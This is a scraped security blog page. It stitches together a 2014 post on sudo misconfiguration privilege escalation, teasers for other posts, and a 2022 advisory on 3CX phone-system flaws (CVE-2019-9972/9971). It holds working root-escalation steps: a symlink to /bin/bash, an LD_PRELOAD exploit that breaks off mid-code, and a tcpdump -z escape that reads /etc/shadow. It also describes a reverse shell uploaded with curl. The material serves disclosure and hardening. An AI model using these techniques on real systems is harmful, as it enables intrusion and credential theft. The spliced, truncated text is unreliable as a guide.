# How I got root with Sudo

###### March 17, 2014 • Blog

###### Posted by

Sebastien Macke
###### Share this article

### Introduction

During security engagements, we regularly come across servers configured with the privilege management software Sudo. As with any software, the principle of least privilege must be closely followed, users must be granted the minimum possible privileges to perform necessary tasks or operations. Therefore to securely configure Sudo, user accounts must be restricted to a limited set of commands that they can legitimately execute with elevated privileges (usually those of the root account).

Out in the real world, we don’t often see Sudo configured according to the principle of least privilege. But when we do, we always uncover a mistake or two that allows us to escalate our privileges to root, at which point it’s game over. We win.

The purpose of this post is to present a series of examples of common mistakes and insecure configurations that we have seen and leveraged on production environments during security assessments and how you can make our team’s life that little bit harder.

### Insecure File System Permissions

Consider the following Sudo configuration for our fictitious user account “appadmin”:

`$ sudo -l

[sudo] password for appadmin:

User appadmin may run the following commands on this host:

                (root) /opt/Support/start.sh, (root) /opt/Support/stop.sh,

                (root) /opt/Support/restart.sh, (root) /usr/sbin/lsof`

It all looks good so far. So let’s have a look at these scripts:

`$ ls -l /opt/Support/`

Don’t these file and directory permissions look interesting? We have several options to escalate our privileges here, we could either:

1. Create the non-existent file “stop.sh”
2. Modify the existing file “start.sh”
3. Move the file “restart.sh” and create another file with the same filename

Here is a demonstration of the third option:

`$ mv /opt/Support/restart.sh{,.bak}

$ ln -s /bin/bash /opt/Support/restart.sh

$ sudo /opt/Support/restart.sh

[sudo] password for appadmin:

# id

uid=0(root) gid=0(root) groups=0(root)`

Game over! 🙂

### Environment Variables

Consider the following Sudo configuration for our user account “monitor”:

`$ sudo -l

[sudo] password for monitor:

Matching Defaults entries for monitor on this host:

                !env_reset

User monitor may run the following commands on this host:

                (root) /etc/init.d/sshd`

The env\_reset option is disabled! This means we can manipulate the environment of the command we are allowed to run. Depending on the Sudo version, we may be able to escalate our privileges by passing environment variables, as illustrated by the following well-known exploits:

* PS4 ( [breno](http://packetstormsecurity.com/files/41442/sudo168p10.sh.txt.html) )
* LD\_PRELOAD ( [Kingcope](http://packetstormsecurity.com/files/71988/sudo-local.txt.html) or [Sensepost](http://www.sensepost.com/blog/9108.html) )

Also keep in mind that there may be other dangerous environment variables that we could misuse (think of PERL5OPT, PYTHONINSPECT etc.).

It should be noted though, that even when env\_reset is disabled, most dangerous environment variables are now safely removed by Sudo, based on a default hard-coded blacklist. Run “sudo -V” as root to see this blacklist under “Environment variables to remove”.

However, in Sudo < 1.8.5, we [found](http://seclists.org/oss-sec/2014/q1/510) that environment variables passed in on the command line are not removed even though they should be. Thus we can still escalate our privileges using for example the LD\_PRELOAD technique, as demonstrated below on a fully up-to-date Red Hat Enterprise Linux 5.10 system (only missing the recent [security update](https://rhn.redhat.com/errata/RHSA-2014-0266.html) of course):

`$ rpm -q sudo

sudo-1.7.2p1-28.el5

$ cat > xoxo.c <<'LUL'

#include <unistd.h>

#include <stdlib.h>

void _init()

{

    if (!geteuid()) {

            unsetenv("LD_PRELOAD");

            unlink("/tmp/libxoxo.so.1.0");

The bug is located on line 685 of the file sudo-1.8.4p5/plugins/sudoers/env.c, where a boolean comparison is performed incorrectly. The following patch fixes this issue:

`--- sudo-1.8.4p5/plugins/sudoers/env.c  2012-03-30 04:37:01.000000000 +1100`

In Sudo 1.8.5, the affected code was actually changed and cleaned up which silently fixed the issue. As a result, in Sudo 1.8.5 and above, environment variables passed in on the command line are properly removed.

Note that RHEL 5.10 was vulnerable because it ships the [1.7.2p1](http://vault.centos.org/5.10/os/SRPMS/sudo-1.7.2p1-28.el5.src.rpm) version (with every previous security patches applied) and similarly, RHEL 6.0 through 6.3 inclusive ship a version from the 1.7 branch. However RHEL 6.4 was not vulnerable because it ships the [1.8.6p3](http://vault.centos.org/6.5/os/Source/SPackages/sudo-1.8.6p3-12.el6.src.rpm) version.

We responsibly disclosed this security issue to the vendor, and within a week, the vulnerability was assigned [CVE-2014-0106](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0106) , the details were made [public](http://www.sudo.ws/sudo/alerts/env_add.html) and the [1.7.10p8](http://www.sudo.ws/sudo/maintenance.html#1.7.10p8) security fix was released. While security updates are being rolled out for the affected distributions, a simple workaround is to simply not disable env\_reset, which is the default behaviour.

### Escape to shell

Consider the following Sudo configuration for our user account “john”:

`$ sudo -l`

In this case, john is able to capture network traffic. A perfectly legitimate task for a system administrator, so what could possibly go wrong? The “-z postrotate-command” option (introduced in tcpdump version 4.0.0), is worth knowing:

`$ echo $'id\ncat /etc/shadow' > /tmp/.test`

Note that “-Z root” is required on RedHat-based distributions (Fedora, CentOS, etc.) as they [patch](http://pkgs.fedoraproject.org/cgit/tcpdump.git/diff/tcpdump-4.2.1-eperm.patch?h=f17) the tcpdump package to drop root privileges before handling savefiles.

So what can you do to protect yourself against Sudo abuse? Make sure you scrutinise every program that a user is allowed to run with elevated privileges as there may be ways for users to break out to a nice # prompt. For example, programs such as vi or less, that allow users to invoke arbitrary shell commands (with ! or similar), should be replaced with their more secure counterparts, rvim and cat respectively.

Keen to practice this? Have a go at the following challenge and find out how to pop a root shell. There are at least two ways that we could think of, but one is more intrusive than the other and will impact the system’s integrity. Leave a comment with your solution(s), we’ll publish ours and the most original submissions after a few weeks to not spoil the fun. The environment is just a standard CentOS 6.5 system, the zip package being the only post “default” install addition.

Jan 16, 2025

![Security Advisory: Fortinet Firewall Hack - Cover Photo](https://gosecure.ai/wp-content/uploads/Security-Advisory-Fortinet-Firewall-Hack-300x157.jpg)Recent events have highlighted a critical security disclosure involving Fortinet devices. [A hacker group known as “Belsen Group” has leaked sensitive data allegedly associated with approximately 15,000 Fortinet firewalls.](https://www.infosecurity-magazine.com/news/hacking-group-leaks-config-15k/) The leaked information includes highly sensitive details such as plaintext credentials, firewall configurations, and management certificates, raising significant concerns about the potential for unauthorized access and exploitation.

Dec 20, 2024

![](https://gosecure.ai/wp-content/uploads/December-2024-THOTM-300x157.jpg)![](data:image/svg+xml...)In December 2024, GoSecure Threat Hunters have identified a concerning use of remote access software by cybercriminals to gain initial access within corporate environments. The attackers start by flooding a victim’s email with spam and then pose as IT support via Microsoft Teams. This social engineering tactic lures victims into installing remote access software, which is then exploited to deploy a custom implant that exfiltrates sensitive information and sets the stage for ransomware attacks.

Effective disaster preparedness is about anticipating potential challenges and equipping your organization with the tools and plans to manage them effectively. Natural disasters not only disrupt physical infrastructures but also create ripe conditions for cybercriminals to exploit heightened vulnerabilities.

# Security Advisory: Multiple Vulnerabilities Impact 3CX Phone System

by [Julien Pineault](https://gosecure.ai/blog/author/julien-pineault/ "Posts by Julien Pineault") | May 31, 2022

![](/wp-content/uploads/8Wb8kdmw2H34nu.jpg)

A GoSecure Titan Lab investigation found that 3CX phone system servers were vulnerable to two different attacks: authenticated command injection and privilege escalation. When combined with the 3CX cloud free trial, these vulnerabilities could allow an attacker to escape the restricted terminal and gain a “free” virtual server. In this article, we will describe what a 3CX phone system server is, how these vulnerabilities can be exploited and how they affect this product.

### Impact

The two vulnerabilities that affect the 3CX phone system server (Linux) are authenticated command injection and privilege escalation. These vulnerabilities require a valid user and password to log into the server and can allow the attacker to access the underlying OS and leverage [sudoers misconfigurations](https://attack.mitre.org/techniques/T1548/003/) to escalate privileges. This could give an attacker full administrator access to the server.

### Affected Products

During our research we found these to be the affected product versions:

* 3CX Phone System 16.0.0.1570 (Debian based installation)

### CVE IDs

We reported these vulnerabilities to the vendor, and these are the assigned CVEs:

* Authenticated Command Injection: CVE-2019-9972
* Privilege Escalation: CVE-2019-9971

### Technical Analysis

Private Branch Exchange (PBX) phone systems, such as the 3CX phone system,  allow an enterprise to have a private phone network. Companies benefit from the ability for users to communicate securely and privately with each other through the internal phone network.  The 3CX phone system can offer remote access and phone service over VoIP when connected to the internet, as well as integrated video conferencing, chat and other features.

3CX offers this solution in two forms: cloud hosting and on-premises. Based on our research, these two choices are both vulnerable, and they could pose a danger to the companies using this software.

#### CVE-2019-9972

The Phone System Terminal offers a restricted environment for the user to configure the 3CX Phone System. It is “restricted” because it does not allow the execution of system commands and protects the underlying OS from any change a user might perform. However, it is possible to break out of this restricted terminal by abusing the terminal’s parsing process. During this parsing process, new lines are wrongly handled. By using **SHIFT-ENTER,** an attacker was allowed to inject an arbitrary command.

#### Proof of Concept

The terminal was normally used for troubleshooting purposes (i.e., instance health check) and can be found in the admin panel of the instance.  This service appears to send each command to a real interpreter running in the background. The interpreter running in the background will parse the commands and execute them, depending on if the command is allowed or not.

![](/wp-content/uploads/GI-1LYuCaOoJye-1024x674-1.jpg)![](data:image/svg+xml...)

Image 1 – Terminal access from the PBX dashboard

Several predetermined commands can be executed by the user, for example, the command *reboot* will restart the instance. As we mentioned earlier, this command will be executed but no other command should be carried out unless allowed by the interpreter. However, it was observed that injecting a return carriage would fool the enforcement carried out by the interpreter. An attacker could pass a valid command, followed by a return carriage and a Unix command which will be evaluated and executed by the phone system.

For our proof-of-concept, curl was used to upload a python script given that we have the flexibility to execute any arbitrary command. This python script is a simple reverse shell that will supply a functional shell to an attacker.

![](/wp-content/uploads/bHUnFGC4KXrLdF.png)![](data:image/svg+xml...)

Therefore using the cloud trial version of 3CX, an attacker with administrator access could use the terminal functionality as a normal Unix terminal bypassing all restrictions. The severity of this bug alone is minimal, but our researchers were able to elevate their privilege and then fully control the Linux server running the phone system.

#### CVE-2019-9971

The next step for the researchers was to escalate their privileges on the phone system. It was observed that the user *phonesystem* could execute the command tcpdump with sudo without providing the user’s password. Typically, sudo is a program that enables the user to execute programs with higher or superuser privileges if permitted. In our case, the use of sudo along with certain executables can lead to a privilege escalation exploitation technique called Living Off the Land (LOL). Usually, the use of this technique will depend on binaries that come installed with the operating system.

As presented below, listing the sudo entries for the current user shows that the tcpdump command can be executed as administrator without a password.

![](/wp-content/uploads/ASAmfQx6JtOXz_.png)![](data:image/svg+xml...)

Image 4 – Listing sudo privileges for the current user.

Searching in [GTFOBins](https://gtfobins.github.io/), a repository that regroups many documented LOL techniques, it was found that [TCPDUMP](https://gtfobins.github.io/gtfobins/tcpdump/) can be used to execute post-rotation commands as root. Following this, researchers re-used their python script as the program to be executed by tcpdump, by specifying it with the parameter **-z** and the path of the python script.

![](/wp-content/uploads/i2Sk1Eqp-q9wm4.png)![](data:image/svg+xml...) Image 5 – Abusing the sudo privilege for tcpdump and gaining root access.

Consequently, from the low privilege user *phonesystem* researchers were able to escalate privileges as root by abusing the sudo entry for the tcpdump command.

### Vendor Response

After disclosing this behavior to 3CX, CVE-2019-9972 was addressed in the next build **16.0.1.269**. However, CVE-2019-9971 is **still exploitable** in the latest release.

### Mitigation

To mitigate CVE-2019-9972, we recommend the installation of the latest patch offered by 3CX. For CVE-2019-9971, do not share access to the terminal beyond the administrator and strengthen the phone system’s user password.

### Conclusion

While the 3CX phone system offers significant benefits to organizations that want secure, private calling, with VoIP and added features such as chat and video conferencing, the vulnerabilities that GoSecure Titan Labs outlined in this article can be dangerous if not properly addressed. If your company has a 3CX phone system, we highly recommend considering the mitigations listed immediately.
